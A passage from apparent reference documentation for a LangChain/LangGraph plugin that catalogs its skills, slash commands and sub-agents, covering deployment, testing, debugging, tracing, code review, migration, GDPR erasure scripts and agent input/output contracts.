2. **StructuredTool.from_function()** — `DatabaseQueryInput` Pydantic schema with `Field` descriptions, `ge`/`le` constraints
3. **Error handling** — `ToolException` with actionable messages, `handle_tool_error=True` on `ToolNode`, custom formatter
4. **Async tools** — `async def @tool`, `httpx.AsyncClient`, `asyncio.to_thread` for sync wrapping
5. **ToolNode in LangGraph** — full working graph with `tools_condition`, `LoggingToolNode` subclass
6. **Toolkits** — `BaseToolkit` subclass, `DatabaseConfig` Pydantic model, factory-function pattern, `SQLiteToolkit` example
7. **Built-in tools** — Tavily, DuckDuckGo, Wikipedia, Arxiv, PythonREPL with install commands, comparison table
8. **MCP integration** — `MultiServerMCPClient` with stdio and SSE transports, community server catalogue

**Design principles section:** idempotency, description quality, input validation, logging, retry/rate-limit helper, independent testing.

---

#### lc:deploy

**File:** `skills/lc-deploy/SKILL.md`

**Description:** Deployment guides for all LangGraph hosting targets.

**Discovery flow (4 questions):**
1. Target environment (local / cloud / self-hosted)?
2. Expected scale (1 user / small team / production)?
3. Human-in-the-loop required?
4. Persistence required (checkpointing)?

**Routing table:** (target, scale, HITL, persistence) â†’ deployment path.

**Five complete deployment options:**

1. **Local dev server** — `langgraph.json` with all fields explained, `langgraph dev` flags, Python SDK client example
2. **LangGraph Platform** — `langgraph build`, `RemoteGraph` client, API endpoint table, full HITL interrupt/resume example
3. **LangServe (legacy)** — complete `server.py` with `add_routes()`, generated endpoint table, migration path to LangGraph Platform
4. **Docker** — two-stage `Dockerfile` with health check and non-root user, `docker-compose.yml` with PostgreSQL health-gated startup, `PostgresSaver` wiring
5. **Kubernetes** — full manifest set (Namespace, ConfigMap, Secret, Deployment with probes, Service, HPA, Ingress, PostgreSQL StatefulSet)

**Environment configuration:** `.env`, Pydantic Settings class, AWS Secrets Manager and GCP Secret Manager snippets.

**Production checklist:** MemorySaver â†’ PostgresSaver, LangSmith tracing, tenacity retry wrapper, rate limiting with slowapi, graceful shutdown.

---

#### lc:test

**File:** `skills/lc-test/SKILL.md`

**Description:** Complete testing strategy for LangChain/LangGraph from unit tests through LangSmith CI/CD gates.

**Three testing layers:**

**Layer 1 — Unit tests (no LLM calls):** `conftest.py` with shared fixtures, `FakeListChatModel` for deterministic mocking, testing nodes as plain Python functions, testing tools with `.invoke()`, testing LCEL chains with mock LLMs, testing output parsers. All instant and free.

**Layer 2 — LangGraph state testing:** injecting state dicts directly into nodes, testing conditional edge routing, testing full compiled graphs with `MemorySaver` + fake LLM, testing checkpointing via history across two `invoke()` calls.

**Layer 3 — Integration tests:** `@pytest.mark.integration` marker, `pytest.ini` to filter fast/slow, `claude-haiku-4-5` for cost control, verifying tool calls in message history.

**LangSmith evaluation:** `create_dataset()` + `create_examples()`, `aevaluate()` with async target and custom evaluators, `EvaluationResult` with score/comment, comparing two versions with `asyncio.gather()`.

**Built-in evaluators:** `LangChainStringEvaluator` for criteria/qa/json_validity, `EmbeddingDistanceEvaluator`, `StringDistanceEvaluator`.

**Custom evaluators:** `make_llm_judge()` factory, PII detection, citation checking evaluators with proper `Run`/`Example` signatures.

**RAG evaluation:** retrieval relevance + answer faithfulness evaluators, RAGAS integration with 4 metrics.

**CI/CD:** full GitHub Actions YAML with three jobs (unit on push, integration on merge to main, eval gate on release), `eval_gate.py` failing CI when any metric drops below threshold, `max_concurrency` and example limits for cost control.

---

#### lc:debug

**File:** `skills/lc-debug/SKILL.md`

**Description:** Debugging guide organized by symptom type, with a quick-lookup error table and minimal repro template.

**Step 0 — Enable Visibility (always first):** Set `LANGCHAIN_VERBOSE=true`, `LANGCHAIN_DEBUG=true`. Set `LANGSMITH_TRACING=true`. Use `pprint` on state objects. Add `print(f"[NODE] state keys: {list(state.keys())}")` at node entry.

**Seven error categories:**

1. **Import Errors** — wrong package names, version conflicts, missing optional deps. Error â†’ cause â†’ fix table. `pip show langchain-core` to verify versions. Common: `langchain.chat_models` moved to `langchain_community` or `langchain_anthropic`.

2. **LLM Call Errors** — `AuthenticationError` (wrong key), `RateLimitError` (no retry), `ContextLengthExceeded` (prompt too long), `APIConnectionError` (network). Error table + retry pattern with tenacity.

3. **LCEL Chain Errors** — type mismatch between chain steps, missing output parser, `RunnablePassthrough` key not in dict, `RunnableParallel` key access patterns. Debugging with `.with_config({"run_name": "debug"})`.

4. **Output Parser Errors** — `OutputParserException`, LLM not returning valid JSON, `with_structured_output` returning `None`. Fix: use `with_structured_output` over manual parsers for tool-calling models.

5. **LangGraph-Specific Errors** — `InvalidUpdateError` (node returns `None` instead of dict), `GraphRecursionError` (missing termination condition), wrong reducer causing state overwrite, missing `START`/`END` edges, forgetting `.compile()`.

6. **Checkpointing Errors** — wrong `thread_id` (new conversation each time), missing `setup()` on `AsyncPostgresSaver`, `MemorySaver` not shared between compile and invoke, serialization errors for non-JSON-serializable state fields.

7. **Async Errors** — `RuntimeError: Event loop is already running` (use `nest_asyncio` or `asyncio.run()`), sync tool called in async context, `asyncio.to_thread` for CPU-bound work.

**Quick-lookup table:** error string â†’ category, at the bottom for fast scanning.

**Minimal repro template:** 30-line file to isolate any LangGraph bug with a single node, fake LLM, and explicit state print.

---

#### lc:monitor

**File:** `skills/lc-monitor/SKILL.md`

**Description:** LangSmith monitoring from initial setup through production dashboards and Prompt Hub A/B testing.

**9 domains:**

1. **Initial Setup** — `pip install langsmith`, four env vars, creating a project in the UI, verifying the first trace.

2. **Automatic Tracing** — what gets traced with zero code (LLM, chain, agent, tool, retriever, prompt), trace tree structure, tags/metadata at call time.

3. **Manual Tracing** — `@traceable` for arbitrary Python functions, `RunTree` context manager for custom spans with explicit child spans, cross-service trace context propagation via HTTP headers.

4. **Production Tracing Patterns** — per-environment project naming, user_id + session_id in metadata, cost attribution by feature/tenant, thread-safe per-call sampling.

5. **Datasets and Evaluation** — creating dataset from traces in UI, programmatic `create_examples`, `aevaluate()` with LLM-as-judge, UI regression comparison between experiment runs.

6. **Online Evaluation** — `client.read_run()` + judge pattern for post-hoc scoring, UI Automations rule setup, Slack/email alerting on quality drops.

7. **Custom Metrics and Feedback** — `client.create_feedback()` for numeric scores, thumbs-up/down from users, surfacing `run_id` back to application so frontend can post feedback.

8. **Monitoring Dashboards** — built-in metrics table (latency, RPS, errors, tokens, cost), custom chart setup, alert configurations for cost/latency P99/error rate, model-tagging for cost breakdown.

9. **Prompt Hub** — `push_prompt` / `pull_prompt` with version pinning, deterministic A/B test by `user_id` hash, filtering by tag in LangSmith to compare experiment arms.

---

#### lc:lcel

**File:** `skills/lc-lcel/SKILL.md`

**Description:** LangChain Expression Language deep dive, covering all Runnable types, composition patterns, streaming, and async.

**9 parts:**

1. **Runnable Interface** — `invoke/batch/stream/ainvoke/abatch/astream` on the simplest chain, why `StrOutputParser` matters
2. **Pipe Composition** — how `|` works at Python level (calls `__or__`), common type flows, incremental pipeline building with structured output
3. **Core Runnables** — `RunnablePassthrough.assign()` for RAG context threading, `RunnableLambda` sync and async, `RunnableParallel` with dict shorthand and `itemgetter`
4. **Branching and Routing** — `RunnableBranch` with keyword routing, `RunnableLambda` for dynamic runtime routing
5. **Error Handling** — `.with_retry()` with tenacity config, `.with_fallbacks()` with static fallback, `.with_listeners()` lifecycle hooks
6. **Streaming Patterns** — `stream()`, `astream()`, `astream_events()` with v2 format, custom streaming transforms via generators
7. **Configuration** — `.bind()`, `RunnableConfig` dict, `.configurable_fields()` with `ConfigurableField`, `.configurable_alternatives()` for swapping whole components
8. **Async Patterns** — FastAPI app with `/ask`, `/ask/stream` SSE, `/analyze` concurrent endpoints
9. **Complete RAG Application** — all concepts unified: `RunnablePassthrough.assign`, `RunnableParallel`, `with_retry`, `configurable_fields`, streaming, batch, source attribution

**Fixtures:** common mistakes table, quick-reference cheat sheet, 4-step diagnostic checklist.

---

## Commands

### /lc-scaffold

**File:** `skills/lc-scaffold/SKILL.md`
**Argument hint:** `[project|agent|graph|rag|tool|chain|evaluator|dockerfile|langgraph-config]`
**Description:** Scaffold LangChain/LangGraph project files. Prints a numbered menu if no argument given.

**Behavior without argument:** Print menu of 9 types with one-line descriptions. Wait for selection.

**Behavior with argument:** Scaffold immediately, then print list of files written + 3 next-step bullets.

**What each type generates:**

| Type | Files | Key patterns |
|---|---|---|
| `project` | `pyproject.toml`, `src/__init__.py`, `src/agent.py`, `.env.example`, `.gitignore`, `README.md` | Hatchling build, dev/prod optional deps, ruff + mypy config |
| `agent` | `state.py`, `agent.py`, `tools.py`, `main.py` | `AgentState` TypedDict, `@tool` with `ToolException`, `ToolNode`, `MemorySaver`, streaming + HITL variants |
| `graph` | `state.py`, `nodes.py`, `edges.py`, `graph.py` | `add_messages` + `operator.add` reducers, routing functions in `edges.py`, `build_graph(checkpointer)` factory |
| `rag` | `loader.py`, `splitter.py`, `embedder.py`, `retriever.py`, `chain.py` | PDF/URL/dir loading, `RecursiveCharacterTextSplitter`, Chroma persist, similarity/MMR/BM25-hybrid retrievers |
| `tool` | `tool.py`, `test_tool.py` | 4 patterns: `@tool`, Pydantic `args_schema`, async `@tool`, `BaseTool` class; `ToolException` throughout; unit + integration tests |
| `chain` | `prompt.py`, `chain.py`, `main.py` | LCEL `\|` composition, `RunnableParallel`, `RunnableBranch`, `with_structured_output`, streaming/batch/async demos |
| `evaluator` | `evaluator.py`, `dataset.py`, `run_eval.py` | `@run_evaluator` exact-match + keyword-coverage + LLM-as-judge + hallucination evaluators, dataset CRUD, `evaluate()` with concurrency |
| `dockerfile` | `Dockerfile`, `docker-compose.yml` | Multi-stage build, non-root user, `HEALTHCHECK`, PostgreSQL with `service_healthy` dependency |
| `langgraph-config` | `langgraph.json`, `src/server.py` | `graphs` mapping, `store.index` for semantic memory, `auth` path, auto-generated endpoint table |

**Design invariants baked into every template:**
- `load_dotenv()` at module top
- `LANGSMITH_TRACING=true` in `.env.example`
- `MemorySaver` default, `PostgresSaver` shown as production swap
- All state list fields use reducers (`add_messages` or `operator.add`)
- `ToolException` (not bare `Exception`) in every tool
- Pydantic v2 `BaseModel` for all structured LLM outputs
- Full type hints on every function

---

### /lc-docs

**File:** `skills/lc-docs/SKILL.md`
**Argument hint:** `<topic>`
**Description:** Fetch live docs via Context7 and produce a structured 5-section answer.

**7 execution steps:**

1. **Parse Topic** — extract from `$ARGUMENTS`. If missing, prompt with concrete examples.
2. **Resolve Library** — classify topic as LangChain, LangGraph, LangSmith, or both using routing table. Call `mcp__plugin_context7_context7__resolve-library-id`. Parallel calls for cross-library topics.
3. **Fetch Docs** — call `mcp__plugin_context7_context7__query-docs` with `tokens: 4000`. Fallback broadening table for sparse results (e.g. "interrupt" â†’ "langgraph interrupt human-in-the-loop").
4. **Detect Ambiguity** — six known ambiguous topics (memory, streaming, state, tools, graph, checkpointing) ask one focused disambiguation question.
5. **Handle Unknown** — when docs return nothing, say so and suggest three alternatives. Never hallucinate from training data.
6. **Synthesize Answer** — structured 200-500 word response: What it is, When to use it, Runnable code example, Common mistakes table, Source link.
7. **Version Note** — if user specified a version, append what changed between that version and current.

**Quality rules:** code uses `claude-sonnet-4-6`, `load_dotenv()` first, LCEL pipe syntax, no deprecated APIs. One excellent example, not many mediocre ones.

---

### /lc-trace

**File:** `skills/lc-trace/SKILL.md`
**Argument hint:** `<file.py>`
**Description:** Inject LangSmith tracing into an existing Python file by detecting components and applying the correct transformation.

**7 detection and transformation rules:**

| Rule | Trigger | Transformation |
|---|---|---|
| A | `\|` operator, `.pipe()`, `RunnableSequence` | Add `run_name`, `tags`, `metadata` to every `.invoke()` call |
| B | `StateGraph`, `.compile()`, `.add_node()` | Add `run_name`, `tags`, `metadata` to every `app.invoke()` / `app.astream()` config dict |
| C | Function passed to `graph.add_node(name, fn)` | Add `config: RunnableConfig = None` parameter; pass `config=config` to nested `llm.invoke()` |
| D | Plain Python function, 3+ lines, external calls, no LangChain decoration | Add `@traceable(name="TitleCase", tags=[...])` |
| E | `@tool` decorator | No code added; add docstring if missing |
| F | `if __name__ == "__main__"` block | Wrap body in `with trace(name="...", project_name=..., tags=["manual","dev"]):` |
| G | `load_dotenv` missing from file | Add `from dotenv import load_dotenv` and `load_dotenv()` after stdlib imports |

**`.env` setup check:**
- `LANGSMITH_API_KEY` missing â†’ append placeholder + `LANGSMITH_TRACING` + `LANGSMITH_PROJECT`
- `LANGSMITH_TRACING` missing â†’ append `LANGSMITH_TRACING=true` + `LANGSMITH_PROJECT`
- `LANGSMITH_PROJECT` missing â†’ append `LANGSMITH_PROJECT=langchain-lab`
- All present â†’ no change, report "already configured"

**Rule application order:** G â†’ E â†’ C â†’ D â†’ A/B â†’ F (prevents double-decoration)

**Output:** before/after diff + plain-language summary of every change made.

**Never changes:** function logic, MemorySaver/PostgresSaver choice, existing `@traceable` or `@tool` decorations, trivially small functions (under 3 lines), dunder methods.

---

### /lc-review

**File:** `commands/lc-review.md`
**Argument hint:** `[file.py]`
**Description:** Review a LangChain/LangGraph Python file across 5 dimensions. Read-only (`allowed-tools: Read, Glob, Grep`).

**4-step execution flow:**

1. **Identify target** — use argument if given, else use currently open file.
2. **Five-dimension scan:**

| Dimension | Checks |
|---|---|
| 1 — Correctness | LCEL type mismatches, node missing dict return, wrong reducer, tool schema errors, missing output parser |
| 2 — Best Practices | Deprecated chain classes, sync in async graph, missing `with_structured_output`, missing LangSmith tracing |
| 3 — Performance | Sync calls in loop, missing `batch()`, unbounded context window, unset `max_tokens` |
| 4 — Common Pitfalls | Mutable state, missing `recursion_limit`, unbounded memory growth, `ToolException` not used, hardcoded API keys |
| 5 — Production Readiness | `MemorySaver` in prod, no monitoring, shared `thread_id`, large state blobs, no retry logic |

3. **Structured finding blocks:** each finding requires `file:line`, severity (CRITICAL/HIGH/MEDIUM/LOW), verbatim BEFORE snippet, minimal AFTER fix.
4. **Summary scorecard:** table grouped by dimension, "must-fix before merging" list (CRITICAL/HIGH only).

**Severity definitions:** CRITICAL=crashes at runtime, HIGH=wrong behavior/security, MEDIUM=performance/maintainability, LOW=style/suggestion.

**"No issues found" is a valid and complete output.** Command never writes files.

---

### /lc-explain

**File:** `skills/lc-explain/SKILL.md`
**Argument hint:** `<concept>`
**Description:** Explain a LangChain/LangGraph concept with a fixed 6-section format including analogy, code, and mistakes.

**Six-section output format (always in this order):**
1. **What it is** — one sentence, no jargon without inline definition
2. **The analogy** — always starts with "[Concept] is like [familiar thing]..."
3. **When you need it** — exactly three bullet points, distinct scenarios
4. **Minimal code example** — 10-20 lines, self-contained, runnable, uses `claude-sonnet-4-6`, includes `load_dotenv()` and a `print()`
5. **Common beginner mistakes** — three-column table: Mistake | What goes wrong | Fix
6. **What to learn next** — 2-3 items, always ends with at least one `/lc-*` skill reference

**Project file detection:** scan `.py` files for concept-specific patterns. If hits found, append "You're already using this" section with file paths and line numbers. Silently omit if no hits.

**Known concepts catalog (15 entries):** StateGraph, checkpointing, LCEL, RAG, ToolNode, MessagesState, reducers, Send API, interrupt, RunnablePassthrough, RunnableParallel, embeddings, streaming, LangSmith, supervisors.

**Unknown concept handling:** fuzzy-match against 60+ aliases. If high-confidence match found, explain canonical concept with clarification. If no match, offer three paths: typo suggestions, integration concepts, general LLM concepts in LangChain context.

---

### /lc-patterns

**File:** `skills/lc-patterns/SKILL.md`
**Argument hint:** `[description of your system]`
**Description:** Recommend the right LangChain/LangGraph architecture pattern by analyzing signals in a use-case description.

**Six sequential stages:**

1. **Ambiguity check** — four failure modes checked before analysis: no data/tool context, unclear memory needs, unclear output type, too vague to route. At most 3 clarifying questions.

2. **Signal detection** — 11 signal phrases (documents, history, approve, parallel, critique, search, plan, multi-domain, real-time, structured output, external API) each mapped to pattern votes. Combination rules for composed signals.

3. **Pattern resolution** — 9 primary patterns (complexity 1-5) + 3 secondary modifiers (Checkpointing, Streaming, HITL). Simplification rule: if signals point to complexity 4+ but use case is simple, recommend the simpler path with explicit rationale.

4. **Output format (6 mandatory sections):**
   1. Recommended Pattern (plain English)
   2. Why This Fits (signals â†’ components, assumptions stated)
   3. Architecture Overview (ASCII diagram, 9 canonical templates)
   4. Key Components (pip installs, class names, env vars)
   5. Complexity 1-5 (four-axis: setup / logic / testing / prod)
   6. Next Step (exact skill to invoke from routing table)

5. **Composition guidance** — when two patterns needed, explains integration point before diagram. 6 canonical compositions.

6. **Anti-pattern detection** — 7 over-engineering traps with simpler alternatives. Emits `## Simplification Opportunity` block when triggered.

**Edge cases:** no arguments â†’ canonical 4-question interview. Two equally valid patterns â†’ present both with one differentiating question.

---

### /lc-upgrade

**File:** `commands/lc-upgrade.md`
**Argument hint:** `[file.py or directory]`
**Description:** Detect deprecated LangChain patterns and migrate them to modern equivalents. Requires explicit user confirmation before writing.

**7-step workflow:**

1. **Identify targets** — accepts file path, directory, or prompts.
2. **Scan** — 4 categories, 10 detection rules using string matching.
3. **Emit findings** — structured blocks with verbatim BEFORE code, exact AFTER replacement, severity, and effort estimate.
4. **Migration summary table** — overview with recommended upgrade order.
5. **Confirmation gate** — blocks all edits until user chooses A (apply all), B (apply selected), C (show diffs only), D (apply one), or N (cancel).
6. **Apply changes** — minimal surgical edits, re-reads file before patching, reports success or "manual action needed" per finding.
7. **Post-upgrade checklist** — import verification, test commands, LangSmith setup, LangServe teardown steps.

**10 detection rules:**

| # | Pattern | Category | Severity |
|---|---------|----------|----------|
| 1A | `LLMChain` | Chains â†’ LCEL | BREAKING |
| 1B | `SimpleSequentialChain` / `SequentialChain` | Chains â†’ LCEL | BREAKING |
| 1C | `RetrievalQA` / `RetrievalQAWithSourcesChain` | Chains â†’ LCEL RAG | BREAKING |
| 1D | `ConversationalRetrievalChain` | Chains â†’ LCEL + history | BREAKING |
| 2A | `initialize_agent` / `AgentType` | Agents â†’ LangGraph | BREAKING |
| 2B | `AgentExecutor` / `ConversationChain` | Agents â†’ LangGraph | BREAKING |
| 3A | `ConversationBufferMemory` | Memory â†’ MessagesState | BREAKING |
| 3B | `ConversationSummaryMemory` | Memory â†’ summary node | HIGH |
| 3C | `VectorStoreRetrieverMemory` | Memory â†’ tool/node | HIGH |
| 4A | `langserve` / `add_routes` | LangServe â†’ LG Platform | MEDIUM |

**Design invariant:** no silent writes. Confirmation gate is mandatory. BEFORE blocks are verbatim copies from source, never reconstructed. AFTER blocks are minimal — only the deprecated pattern is replaced, surrounding code is never reformatted.

---

### /lc-erase

**File:** `commands/lc-erase.md`
**Argument hint:** `<user_id>`
**Description:** Generate a GDPR Article 17 right-to-erasure implementation for a specific user. Scans the project for active data stores, generates `compliance/erase_user.py` and `compliance/erasure_audit.sql`, and prints a 30-day deadline reminder.

**7-step execution flow:**

1. **Parse user_id** — extract from `$ARGUMENTS`; prompt if missing.
2. **Confirmation gate** — print an explicit warning block naming the target user_id and all data stores that will be affected. Block until user types `y` or `yes`.
3. **Detect data stores** — parallel Grep across the project for: `PostgresSaver`/`AsyncPostgresSaver`, Chroma, Pinecone, Qdrant, pgvector, `langsmith`, generic `VectorStore`. Print a detected/not-detected summary table.
4. **Generate `compliance/erase_user.py`** — async `delete_user_data(user_id)` with:
   - PostgresSaver: `DELETE WHERE thread_id LIKE 'tenant:%:user:{user_id}:%'` via asyncpg
   - Vector store: `delete(where={"user_id": user_id})` — active block for detected store, commented-out alternatives for others
   - LangSmith: `list_runs(filter='has(metadata, {"user_id": "..."})') â†’ delete_runs()` with batching at 100 runs
   - Audit log: `INSERT INTO compliance.erasure_audit` (erasure event — never DELETE)
   - Audit row redaction: `UPDATE audit.llm_calls SET session_id='[GDPR Art.17 erased ...]'` (never DELETE)
   - Returns `ErasureResult(status, records_deleted, timestamp, erasure_record_id)`
   - `__main__` block with `--dry-run` flag
5. **Generate `compliance/erasure_audit.sql`** — DDL including:
   - `compliance.erasure_audit` table (INSERT-only for app role, REVOKE DELETE, REVOKE UPDATE)
   - `ALTER TABLE audit.llm_calls ADD COLUMN IF NOT EXISTS redacted_at TIMESTAMPTZ`
   - `compliance.erasure_summary` view
   - `compliance.erasure_deadline_risk` view (finds requests at risk of missing the 30-day window)
6. **Print 30-day deadline reminder** — today's date, computed deadline (today + 30 days), and a 5-item compliance checklist.
7. **Print summary** — files generated, stores covered, 5 next-step bullets.

**Generated files:**

| File | Purpose |
|---|---|
| `compliance/erase_user.py` | Runnable async erasure function + CLI entrypoint |
| `compliance/erasure_audit.sql` | DDL for immutable erasure record table |

**Compliance invariants enforced:**
- `ErasureResult` uses Pydantic v2 (`BaseModel`, `Field`) — never v1 validators
- The `compliance.erasure_audit` table NEVER has DELETE granted to the app role
- `audit.llm_calls` rows are NEVER deleted — only redacted via UPDATE
- The erasure audit INSERT fires even if all store deletions fail (with error counts recorded)
- All database connection strings come from environment variables (`DATABASE_URL` / `POSTGRES_URL`)
- `load_dotenv()` is called before any `os.environ` reads
- `--dry-run` prints what would be deleted without touching any data store

**Relationship to other skills:**
- Builds on `lc:compliance` Pattern 3 (GDPR data subject rights) — provides a more complete, project-specific implementation
- Uses the `audit.llm_calls` table defined in `lc:audit` Pattern 1 — adds `redacted_at` column
- For the full compliance picture, run `lc:compliance` first, then use `/lc-erase` per-user

---

### /lc-antipatterns

**File:** `commands/lc-antipatterns.md`
**Argument hint:** `[1-15 | keyword | scan <file.py>]`
**Description:** Interactive catalog of the 15 most common LangChain/LangGraph production mistakes. Read-only (`allowed-tools: Read, Glob, Grep`).

**Dispatch logic:**
- No argument â†’ print numbered menu of all 15 antipatterns with one-line descriptions; wait for selection.
- Number 1â€“15 â†’ display that antipattern entry immediately.
- Keyword (e.g. `memorysaver`, `recursion`, `pii`, `llmchain`) â†’ fuzzy-match to closest entry and display it.
- `scan <file.py>` â†’ scan file for presence of each antipattern using detection signals table; report findings.

**15 antipatterns covered:**

| # | Title | Severity in production |
|---|---|---|
| 1 | LLMChain in 2024+ | BREAKING (removed in v1.0) |
| 2 | AgentExecutor instead of LangGraph | BREAKING (removed in v0.3) |
| 3 | MemorySaver in production | HIGH (full state loss on restart) |
| 4 | Node returns None instead of dict | HIGH (InvalidUpdateError crash) |
| 5 | Mutable state in nodes | HIGH (nondeterministic state, reducer bypass) |
| 6 | Missing recursion_limit | HIGH (infinite loop, infinite API spend) |
| 7 | Forgetting .compile() | HIGH (AttributeError at invoke time) |
| 8 | Wrong import paths | BREAKING (ModuleNotFoundError in v0.3+) |
| 9 | Sync tool in async graph | MEDIUM (blocks event loop, kills concurrency) |
| 10 | ConversationBufferMemory unbounded | MEDIUM (OOM or context window crash at scale) |
| 11 | One DB connection per request | MEDIUM (connection exhaustion at 5+ users) |
| 12 | Hardcoded thread_id | HIGH (all users share one conversation) |
| 13 | @tool function called directly | MEDIUM (bypasses error handling and tracing) |
| 14 | Naive retry without jitter | MEDIUM (thundering herd on rate limits) |
| 15 | LangSmith always-on with PII in state | HIGH (compliance violation, data leakage) |

**Entry format:** each antipattern entry contains: Symptom you'll see, Root cause, Why it hurts in production, Fix (before/after code, 10â€“20 lines), Related antipatterns.

**Scan mode:** reads target file, checks 15 detection signals (string patterns + structural checks), reports each finding with file:line, matched text, risk summary, and a pointer to the full entry. Produces a summary table with severity column. If no antipatterns are found, says so explicitly.

**Design invariant:** read-only — the command never writes, edits, or modifies any file. After every entry display, prompts for next action (another number, keyword, scan, or exit).

**Relationship to other commands:**
- `/lc-upgrade` — applies mechanical fixes for deprecated classes (AP 1, 2, 10); `/lc-antipatterns` teaches why the patterns are harmful and covers runtime/architectural mistakes that `/lc-upgrade` does not address.
- `/lc-review` — Dimension 4 (Common Pitfalls) and Dimension 5 (Production Readiness) overlap with AP 3â€“7, 10â€“12; `/lc-antipatterns` provides deeper explanations and interactive browsing.

---

## Agents

### lc-architect

**File:** `skills/lc-architect/AGENT.md`

**Description:** Architecture specialist that produces a ten-section architecture document for complex multi-pattern systems.

**Invoked by:**
- `lc:design-system` when complexity exceeds a single pattern
- `lc:agent` for Supervisor/Plan-and-Execute with 3+ domains
- `lc:rag` for complex multi-hop + high-stakes boundary
- `lc:memory` for 2+ combined patterns or cross-tenant isolation
- `feature-dev` for any new node/subgraph/state field on an existing graph

**Input contract (structured `ARCHITECT_INPUT` block):**
```
ARCHITECT_INPUT:
  system_description: <text>
  patterns_identified: <list>
  clarified_axes:
    state_shape: <ambiguous|clear>
    graph_topology: <ambiguous|clear>
    rag_strategy: <ambiguous|clear>
    memory_isolation: <ambiguous|clear>
    failure_modes: <ambiguous|clear>
```

**Clarifying question protocol:** ask only when one of the five axes is ambiguous. All questions go in a single message. If input is unambiguous on all axes, proceed without asking.

**Output:** ten-section architecture document at `docs/specs/YYYY-MM-DD-<system-name>-arch.md`, followed by structured `ARCHITECT_OUTPUT` block:
```
ARCHITECT_OUTPUT:
  spec_path: <path>
  patterns_selected: <list>
  ready_for_implementation: true|false
  blocking_questions: <list or empty>
```

**Ten document sections:** System Overview, ASCII Architecture Diagram, State Schema (TypedDict), Components table, Data Flow narrative, Memory Architecture, Deployment Target + env vars, Testing Strategy, Open Questions checklist, Implementation Order.

**Tools used:** Glob + Grep + Read (codebase compatibility), WebSearch (third-party APIs), Context7 (LangChain/LangGraph docs), Write (output document).

**System prompt persona:** Expert architect. Five prioritized instincts: correctness, explicit specification, fail-safe defaults, scale-awareness, observability. Five hard rules: infinite loop guards on all graphs, explicit error paths, `Annotated` reducers for all list fields, `thread_id` formula documented, complete documents before returning. Non-conversational — produces artifacts, not chat.

---

### lc-coder

**File:** `skills/lc-coder/AGENT.md`

**Description:** Code generation specialist. Writes production-quality LangChain/LangGraph code with automatic verification.

**Invocation:** direct `/lc-coder`, dispatch from planning agents (`feature-dev`, `lc-agent`), or rewrite/extend on existing files. Does NOT handle debugging (â†’ `lc-debug`), deployment (â†’ `lc-deploy`), or test writing (â†’ `lc-test`).

**Input contract:**
- Required: plain-English description
- Optional: `--context <file paths>` (read before writing)
- Optional: `--constraints <overrides>` (e.g. `--constraints "use AsyncPostgresSaver"`)

**Output contract:** always three outputs:
1. Primary module (`<name>.py`)
2. Test file (`test_<name>.py`)
3. `requirements.txt` fragment

`--extend` mode emits targeted Edit diffs instead of full rewrites.

**Pre-generation reads:** Glob â†’ Read â†’ Grep to detect state fields, imports, checkpointer type, Pydantic version. Ambiguity resolved by assumption + `# ASSUMPTION:` comment, not by stopping.

**15-item code quality checklist:**
1. `recursion_limit` on all `compile()` calls
2. `load_dotenv()` at module top
3. No hardcoded API keys (use `os.environ.get(...)`)
4. `ToolException` in every `@tool`
5. `handle_tool_errors=True` on every `ToolNode`
6. LangGraph 1.2.x API only
7. Pydantic v2 only (no `validator`, use `field_validator`)
8. LCEL pipe syntax (never `LLMChain`)
9. `async def` for LLM nodes where possible
10. `claude-sonnet-4-6` as default model string
11. `Annotated[list, add_messages]` or `Annotated[list, operator.add]` for all list state fields
12. `MemorySaver` default, `PostgresSaver` shown as prod swap
13. Full type hints on every function
14. No `AgentExecutor`, `initialize_agent`, `ConversationBufferMemory`
15. Docstrings on all `@tool` functions

**Verification protocol:** 10-item Grep checklist + 7 Read-based logic checks run after every write. Self-correction: up to 2 Edit rounds. Unresolved failures surfaced as `UNRESOLVED:` notes, never silently dropped.

**Canonical file structure (in order):** module docstring â†’ stdlib imports â†’ `from dotenv import load_dotenv` â†’ LangChain imports â†’ `load_dotenv()` â†’ constants â†’ state TypedDict â†’ Pydantic models â†’ tool functions â†’ LLM instantiation â†’ node functions â†’ routing functions â†’ `build_graph(checkpointer)` factory â†’ `app = build_graph(MemorySaver())` â†’ `if __name__ == "__main__":` block.

---

### lc-reviewer

**File:** `skills/lc-reviewer/AGENT.md`

**Description:** Code review specialist with confidence-tiered findings and a machine-readable merge verdict.

**Seven review dimensions:**

1. **Correctness** — type mismatches, missing dict returns from nodes, wrong reducers (last-write-wins vs append), missing `START`/`END` edges, missing `.compile()`
2. **Best Practices** — deprecated classes (v0.3 removals: `LLMChain`, `AgentExecutor`), async violations, missing output parsers, no LangSmith tracing
3. **Security** — secrets in source code, prompt injection vectors, PII leakage into LangSmith traces, unsafe `eval()` in tool code
4. **Performance** — sync calls in async context, missing `batch()` for list operations, unbounded context window, unset `max_tokens`
5. **Reliability** — missing retry logic, absent `.with_fallbacks()`, no cost controls, `ToolNode` without `handle_tool_errors=True`
6. **Production Readiness** — `MemorySaver` in prod, no observability, shared `thread_id` across users, state blobs over 100KB
7. **Beginner Mistakes** — state mutation (modify in place), forgetting `.compile()`, wrong import paths, calling `@tool` directly instead of via agent

**Confidence filter:** error=100% confidence required, warning=90% required, suggestion=70% required. Never report without a specific line number reference.

**Finding format:**
```
[SEVERITY] [DIMENSION] file.py:line
BEFORE: <verbatim code>
AFTER: <minimal fix>
Confidence: <percentage>
Rationale: <one sentence>
```

**Verdict output:**
```
VERDICT: MERGE-READY | NEEDS-FIXES
BLOCKING: <count of CRITICAL + HIGH findings>
NON-BLOCKING: <count of MEDIUM + LOW findings>
```

**`lc:test` integration:** `NEEDS-FIXES` verdict blocks test generation — calling skill reads this flag.

---

### lc-docs-agent

**File:** `skills/lc-docs/AGENT.md`

**Description:** Documentation retrieval specialist that resolves topics to Context7 library IDs, fetches live docs, and synthesizes a fixed 6-section answer.

**Library registry:**

| Library | Context7 name | Scope |
|---|---|---|
| langchain | `/langchain-ai/langchain` | LCEL, chains, prompts, parsers, memory, callbacks |
| langgraph | `/langchain-ai/langgraph` | StateGraph, nodes, edges, checkpointing, streaming, HITL |
| langsmith | `/langchain-ai/langsmith-sdk` | Tracing, datasets, evaluation, Prompt Hub |

**Topic routing table:**
- LCEL, chains, prompts, parsers â†’ LangChain
- StateGraph, nodes, edges, checkpointing, interrupt, Send â†’ LangGraph
- tracing, datasets, evaluation, Prompt Hub â†’ LangSmith
- memory, streaming, state, agent, tools â†’ disambiguate first

**Execution protocol (6 steps):**
1. Parse and normalize topic
2. Classify using routing table; if ambiguous, ask one question before any tool call
